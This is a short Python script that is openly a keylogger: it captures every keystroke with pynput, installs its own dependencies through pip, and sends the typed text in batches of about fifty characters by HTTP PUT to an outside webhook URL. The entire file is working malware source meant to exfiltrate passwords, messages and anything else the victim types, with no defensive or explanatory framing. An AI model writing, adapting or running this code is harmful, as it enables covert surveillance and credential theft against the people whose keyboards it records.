#!/usr/bin/env python
def main() : 
    send_data(server,"Keylogger is starting")
    start_keylogger()

list = []
server = "http://api.webhookinbox.com/i/5TVfM4Bn/in/"


def send_data(url,data) : 
    requests.put(url,data)


def on_press(key) : 
    if(str(key) == "Key.space") : 
        list.append(" ")
    elif(str(key) == "Key.backspace" and len(list) > 0) : 
        list.pop()
    elif("Key" not in str(key)) : 
        list.append(str(key).replace("\'", ""))

    if(len(list) > 50) : 
        send_data(server, ''.join(list))
        for i in range (0,50) : 
            list.pop()

def start_keylogger() : 
    with Listener (on_press=on_press ) as listener : 
        listener.join()

if (__name__=='__main__') : 
    import os
    os.system("pip install requests && pip install pynput")
    import requests
    from pynput.keyboard import Key, Listener
    main()
